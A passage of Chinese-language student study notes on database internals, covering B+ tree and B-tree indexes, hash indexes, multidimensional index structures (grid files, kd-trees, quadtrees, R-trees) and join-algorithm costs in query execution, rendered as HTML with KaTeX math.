存储块=4096B，整数型索引字段值=4B，指针=8B<br>则n应该满足 4（n-1) + 8n &lt; 4096,n取341为最大值</p><p>指针情况：</p><ul><li>索引字段值x在<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>k</mi><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></msub><mo>&lt;</mo><mi>x</mi><mo>&lt;</mo><msub><mi>k</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">k_{i-1}&lt;x&lt;k_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9028em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>的由<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">p_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>指向；而<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>k</mi><mi>i</mi></msub><mo>&lt;</mo><mi>x</mi><mo>&lt;</mo><msub><mi>k</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">k_i&lt;x&lt;k_{i+1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9028em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span></span></span></span></eq>的由<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>P</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">P_{i+1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8917em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span></span></span></span></eq>指向 非叶节点指针指向索引块，叶子节点指向主文件的数据块或数据记录</li><li>叶子节点的最后一个指针始终指向其下一个数据块</li><li>一个索引块实际使用的索引指针个数d满足(n/2&lt;d&lt;n)</li><li>根节点至少两个指针被使用</li><li>索引字段值重复出现于叶节点和非叶子节点</li><li>指向主文件的指针仅出现在叶子节点</li><li>所有叶子节点即可覆盖所有键值的索引</li><li>索引字段值在叶子节点中是按顺序排列的</li></ul><p>B+树级数相同–平衡，如何保证？</p><ul><li>插入删除记录时，伴随着节点的分裂和合并</li><li>分裂和合并将调整部分节点块中的索引项，需要算法支持</li></ul><h4 id="(4)-%E5%88%A9%E7%94%A8b%2B%E6%A0%91%E5%BB%BA%E7%AB%8B%E4%B8%8D%E5%90%8C%E7%9A%84%E7%B4%A2%E5%BC%95" tabindex="-1">(4) 利用B+树建立不同的索引</h4><p>1： 利用B+树建立键属性稠密索引<br>索引字段是主文件的主键，索引是稠密的。主文件可以按逐渐排序，也可以不按逐渐排序。指针指向的是记录<br>2： 利用B+树建立键属性稀疏索引<br>索引字段是主文件的逐渐，索引是稀疏的。主文件必须按逐渐排序。指针指向的是数据块。</p><h4 id="%EF%BC%885%EF%BC%89-b%E6%A0%91" tabindex="-1">（5） B树</h4><p>不同：</p><ul><li>索引字段值仅出现一次</li><li>主文件的指针也可出现在非叶子节点</li><li>所有节点才能覆盖所有的键值索引</li><li>分裂新增节点原理相似，细节不一样</li></ul><h4 id="%EF%BC%886%EF%BC%89-b%2B%E6%A0%91%E7%9B%B8%E5%85%B3%E7%AE%97%E6%B3%95" tabindex="-1">（6） B+树相关算法</h4><p>检索算法，增加记录的算法，删除记录的算法</p><h3 id="07-b%2B%E6%A0%91%E4%B9%8B%E9%94%AE%E5%80%BC%E6%8F%92%E5%85%A5%E4%B8%8E%E8%8A%82%E7%82%B9%E5%88%86%E8%A3%82%E7%A4%BA%E6%84%8F" tabindex="-1">07 B+树之键值插入与节点分裂示意</h3><h4 id="%EF%BC%881%EF%BC%89-%E6%8F%92%E5%85%A5" tabindex="-1">（1） 插入</h4><p>关键：</p><ol><li>分裂（当插入节点全满时）</li><li>由叶子节点向根节点逐层处理<br>能够自动保持与主文件大小相适应的书的层次<br>每个索引块的指针利用率可以在50%以上</li><li>指针调整</li></ol><h4 id="%EF%BC%882%EF%BC%89-%E5%88%A0%E9%99%A4" tabindex="-1">（2） 删除</h4><ol><li>先定位待删除键值的叶子节点，从根节点向下</li><li>删除键值及其主文件记录</li><li>如指针数目不小于规定数目，则可以结束；否则，需要合并。<ol><li>从相邻节点能否转移一些键值到该节点，如果可以，则转移，并更新父节点的相应键值</li><li>否则考虑节点合并，合并后调整父节点的键值及次序，调整叶子节点的指针链接</li><li>如果父节点在删除索引项及指针后，指针数目小于规定，则继续步骤2，直至根节点；如果不小于规定则结束</li></ol></li><li>如果删除位置是第一个，还需更新父节点键值</li></ol><h3 id="08-%E6%95%A3%E5%88%97%E7%B4%A2%E5%BC%95" tabindex="-1">08 散列索引</h3><h4 id="%EF%BC%881%EF%BC%89-%E6%95%A3%E5%88%97%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5" tabindex="-1">（1） 散列的基本概念</h4><p>由m个桶，每个桶是具有相同容量的存储地，称为主桶，溢出后可设置溢出桶<br>散列函数h（k），可以将键值k映射到{0,1,…m-1}中的某一个值<br>将具有键值k的记录Record（k）存储到对应的h（k）编号的桶中（此处映射应尽可能均匀）</p><h4 id="%EF%BC%882%EF%BC%89%E6%95%A3%E5%88%97%E7%B4%A2%E5%BC%95" tabindex="-1">（2）散列索引</h4><ul><li>内存数据可采用散列确定存储页，主文件可采用散列确定存储块，索引亦可用散列确定散列项的存储块</li><li>m个桶，一个桶可以是一个存储块，也可以是连续存储块</li></ul><h4 id="%EF%BC%883%EF%BC%89-%E6%95%A3%E5%88%97%E7%B4%A2%E5%BC%95%E7%9A%84%E6%8F%92%E5%85%A5%E5%92%8C%E5%88%A0%E9%99%A4" tabindex="-1">（3） 散列索引的插入和删除</h4><p>插入键值d的索引项：</p><ol><li>计算h（d）=2</li><li>如2号桶有空间，则将索引项d插入2号桶</li><li>如没空间，则申请一溢出桶，插入d</li></ol><p>删除键值f的索引项：</p><ol><li>计算h（f）=2</li><li>删除2号桶中的键值f</li><li>将溢出桶中的值放入主桶，删除溢出桶</li></ol><h4 id="%EF%BC%884%EF%BC%89%E6%95%A3%E5%88%97%E7%9A%84%E9%97%AE%E9%A2%98" tabindex="-1">（4）散列的问题</h4><p>散列索引的目标：最好是没有溢出桶，每一个散列值仅有一个桶。读写每一个键值都只写一个存储块。</p><ul><li>均匀分布如何做到？</li><li>桶的数目m如何确定？</li></ul><p>如果桶数m固定----静态散列索引<br>   如果m过大，则浪费，过小则产生更多溢出桶，增加索引检索时间<br>桶的数目随键值增多动态增加—动态散列索引<br>   </p><h3 id="09-%E5%8F%AF%E6%89%A9%E5%B1%95%E6%95%A3%E5%88%97%E7%B4%A2%E5%BC%95%E4%B8%8E%E7%BA%BF%E6%80%A7%E6%95%A3%E5%88%97%E7%B4%A2%E5%BC%95" tabindex="-1">09 可扩展散列索引与线性散列索引</h3><p>先略过，书上有，开卷考现场学来得及</p><p>以下第三章书上有，视频里没有</p><h3 id="10-%E5%A4%9A%E7%BB%B4%E7%B4%A2%E5%BC%95%EF%BC%883.4%EF%BC%89" tabindex="-1">10 多维索引（3.4）</h3><p>多维索引的应用：对地理数据的处理。</p><p>利用传统索引执行范围查询，效果甚微，如果数据小点还可以。</p><p>大多数支持多维数据查询的数据结构归于以下两类</p><ol><li>类散列表方式</li><li>类树方式</li></ol><h3 id="11-%E5%A4%9A%E7%BB%B4%E6%95%B0%E6%8D%AE%E7%9A%84%E6%95%A3%E5%88%97%E7%BB%93%E6%9E%84" tabindex="-1">11 多维数据的散列结构</h3><h4 id="%EF%BC%881%EF%BC%89%E7%BD%91%E6%A0%BC%E6%96%87%E4%BB%B6" tabindex="-1">（1）网格文件</h4><p>一种比单维索引性能好的最简单的数据结构。在每一维上用网格线将空间分成条状，被分成的每个区域可以看成是散列表的一个桶，以此来进行插入和删除.</p><h4 id="%EF%BC%882%EF%BC%89%E5%88%86%E6%AE%B5%E6%95%A3%E5%88%97%E5%87%BD%E6%95%B0" tabindex="-1">（2）分段散列函数</h4><p>散列函数可以接受属性值的一个列表作为参数，以此可以将高维转换到一维。</p><p>这种方法其实在最近邻查询和范围查询中没什么用，点之间的物理距离没有通过桶号反应，否则就是网格文件了。</p><h3 id="12-%E5%A4%9A%E7%BB%B4%E6%95%B0%E6%8D%AE%E7%9A%84%E6%A0%91%E7%BB%93%E6%9E%84" tabindex="-1">12 多维数据的树结构</h3><h4 id="%EF%BC%881%EF%BC%89%E5%A4%9A%E9%94%AE%E7%B4%A2%E5%BC%95" tabindex="-1">（1）多键索引</h4><p>一种简单的树模式，它的每一层的节点是一个属性的索引。</p><p>性能：<br>部分匹配查询：如果属性可以按树的从浅到深的属性索引给出，效率很高，否则很低。<br>范围查询：单个索引在他们本身支持范围查询，效果很好<br>最近邻查询：即为若干个范围查询</p><h4 id="%EF%BC%882%EF%BC%89kd-%E6%A0%91" tabindex="-1">（2）kd-树</h4><h5 id="kd%E6%A0%91%E6%A6%82%E5%BF%B5" tabindex="-1">kd树概念</h5><p>kd树（k维搜索树）是把二叉搜索树推广到多维数据的一种主存数据结构。</p><p>kd树是一个二叉树，它的内部节点有一个相关联的属性a和一个值V，它将数据点集分为两个部分：左子树是a值小于V的部分，右子树是a值大于等于V的部分。<br>并增加以下定义：</p><ol><li>内部节点只有一个属性，该属性具有一个划分值和指向左右子树的指针</li><li>叶子节点是块，快空间存放着尽可能多的记录</li></ol><h5 id="kd%E6%A0%91%E6%93%8D%E4%BD%9C" tabindex="-1">kd树操作</h5><p>查找：同二叉树</p><p>插入：先做一个查找，找到对应的叶子节点，如果叶子节点中的块还有空间，就将新的数据放在那里；否则将块分裂成两个，并根据所在层属性再次划分。最后，我们创建了一个新的内部节点：它的子节点分别为我们分裂得到的两个新块，并且给该内部节点一个相应的划分值。</p><h5 id="kd%E6%A0%91%E4%BC%98%E5%8C%96" tabindex="-1">kd树优化</h5><ol><li>内部节点多分支。kd树内部节点可以有多个键-指针对，让其更像B树节点。</li><li>聚集内部节点到块。可以把多个内部节点压缩到一个块中，减少遍历路径访问的块的数量。</li></ol><h4 id="%EF%BC%883%EF%BC%89%E5%9B%9B%E5%8F%89%E6%A0%91" tabindex="-1">（3）四叉树</h4><p>在四叉树中，每个内部节点对应于二维空间中的一个正方形区域，或是k维空间的k维立方体。在二维的情况，一个节点的子节点即为它二维平面的四个象限。</p><h4 id="%EF%BC%884%EF%BC%89r-%E6%A0%91" tabindex="-1">（4）R-树</h4><p>R树是一种利用B-树的某些本质特征来处理多维数据的数据结构。</p><p>R树表示由二维或更高维区域组成的数据，我们把它称为数据区，R树的一个内部节点对应于某个内部区域，运行子区域有重叠，但应尽量小。</p><h3 id="13-%E4%BD%8D%E5%9B%BE%E7%B4%A2%E5%BC%95" tabindex="-1">13 位图索引</h3><p>略，看书，考场现编</p><h2 id="%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E6%9F%A5%E8%AF%A2%E6%89%A7%E8%A1%8C" tabindex="-1">第四章 查询执行</h2><h3 id="1901-%E6%9F%A5%E8%AF%A2%E5%AE%9E%E7%8E%B0%E7%AE%97%E6%B3%95%E6%A6%82%E8%BF%B0" tabindex="-1">1901 查询实现算法概述</h3><h4 id="%EF%BC%881%EF%BC%89%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9F%A5%E8%AF%A2%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%80%9D%E6%83%B3" tabindex="-1">（1）数据库查询的基本思想</h4><p>基本动作：</p><ul><li>关系模型的基本运算<ul><li>并，差，积，选择，投影</li></ul></li></ul><p>用户语言实现关系模型基本元素的基本组合，随后数据库管理系统（程序执行机构）解释这种组合，并按次序调用基本动作予以执行</p><h4 id="%EF%BC%882%EF%BC%89%E6%9F%A5%E8%AF%A2%E5%AE%9E%E7%8E%B0-vs.-%E6%9F%A5%E8%AF%A2%E4%BC%98%E5%8C%96" tabindex="-1">（2）查询实现 vs. 查询优化</h4><p>SQL语句 经过编译 得到关系代式；<br>关系代式先经过逻辑优化；<br>在经过物理优化（为每一个关系代数才做选择优化的执行例行程序，形成物理查询计划）；<br>最后经过执行引擎运行（依物理查询计划调用的例行程序进行处理，并返回结果）</p><h4 id="%EF%BC%883%EF%BC%89-%E6%9F%A5%E8%AF%A2%E7%AE%97%E6%B3%95%E6%80%BB%E8%A7%88" tabindex="-1">（3） 查询算法总览</h4><ul><li>数据库的三大类操作<ul><li>以此单一元组的一元操作<ul><li>选择，投影</li></ul></li><li>整个关系的一元操作<ul><li>去重，group by，排序</li></ul></li><li>整个关系的二元操作<ul><li>集合的并交差</li><li>包的并交差</li><li>积，连接</li></ul></li></ul></li></ul><h3 id="1902-%E8%BF%9E%E6%8E%A5%E6%93%8D%E4%BD%9C%E7%9A%84%E5%AE%9E%E7%8E%B0%E7%AE%97%E6%B3%95" tabindex="-1">1902 连接操作的实现算法</h3><h4 id="%EF%BC%881%EF%BC%89%E8%BF%9E%E6%8E%A5%E6%93%8D%E4%BD%9C%E7%9A%84%E9%80%BB%E8%BE%91%E5%AE%9E%E7%8E%B0%E7%AE%97%E6%B3%95" tabindex="-1">（1）连接操作的逻辑实现算法</h4><p>两个for循环即可</p><h4 id="%EF%BC%882%EF%BC%89%E8%BF%9E%E6%8E%A5%E6%93%8D%E4%BD%9C%E7%9A%84%E7%89%A9%E7%90%86%E5%AE%9E%E7%8E%B0%E7%AE%97%E6%B3%95" tabindex="-1">（2）连接操作的物理实现算法</h4><p>关系是存储在磁盘上的，磁盘是以磁盘块为操作单位的，首先要装载进内存(I/O操作)，然后在进行元组的处理</p><ul><li>一些参数<ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi>R</mi></msub></mrow><annotation encoding="application/x-tex">T_R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>：关系R的元组数目</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>B</mi><mi>R</mi></msub></mrow><annotation encoding="application/x-tex">B_R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>：关系R的磁盘数目</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span></eq>：主存缓冲区的页数（主存每页容量等于一个磁盘的容量）</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>I</mi><mi>R</mi></msub></mrow><annotation encoding="application/x-tex">I_R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>：关系R的每个元组的字节数</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span></span></span></span></eq>：每个磁盘的字节数</li></ul></li></ul><p>需要错做的Byte数<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>B</mi><mrow><mi>R</mi><mo>×</mo><mi>S</mi></mrow></msub><mo>=</mo><msub><mi>T</mi><mi>R</mi></msub><msub><mi>T</mi><mi>S</mi></msub><mo stretchy="false">(</mo><msub><mi>I</mi><mi>R</mi></msub><mo>+</mo><msub><mi>I</mi><mi>S</mi></msub><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mi>b</mi></mrow><annotation encoding="application/x-tex">B_{R\times S}=T_RT_S(I_R+I_S)/b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8917em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span><span class="mbin mtight">×</span><span class="mord mathnormal mtight" style="margin-right:0.05764em;">S</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05764em;">S</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05764em;">S</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord">/</span><span class="mord mathnormal">b</span></span></span></span></eq></p><h4 id="%EF%BC%883%EF%BC%89%E8%BF%9E%E6%8E%A5%E6%93%8D%E4%BD%9C%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%AE%9E%E7%8E%B0%E7%AE%97%E6%B3%95" tabindex="-1">（3）连接操作的基本实现算法</h4><p>对于关系R，S的连接，一次分别将R和S的一个块从磁盘中移到内存中进行连接<br>复杂度 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>B</mi><mi>R</mi></msub><mo>+</mo><msub><mi>B</mi><mi>R</mi></msub><mo>∗</mo><msub><mi>B</mi><mi>S</mi></msub></mrow><annotation encoding="application/x-tex">B_R+B_R*B_S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05764em;">S</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>,但只需要内存三个块</p><h4 id="%EF%BC%884%EF%BC%89%E8%BF%9E%E6%8E%A5%E6%93%8D%E4%BD%9C%E7%9A%84%E5%85%A8%E4%B8%BB%E5%AD%98%E5%AE%9E%E7%8E%B0%E7%AE%97%E6%B3%95" tabindex="-1">（4）连接操作的全主存实现算法</h4><p>将两个关系都撞入内存中进行连接，此时内存页数需要大于两个关系的内存块数。<br>复杂度<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>B</mi><mi>R</mi></msub><mo>+</mo><msub><mi>B</mi><mi>S</mi></msub></mrow><annotation encoding="application/x-tex">B_R+B_S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord 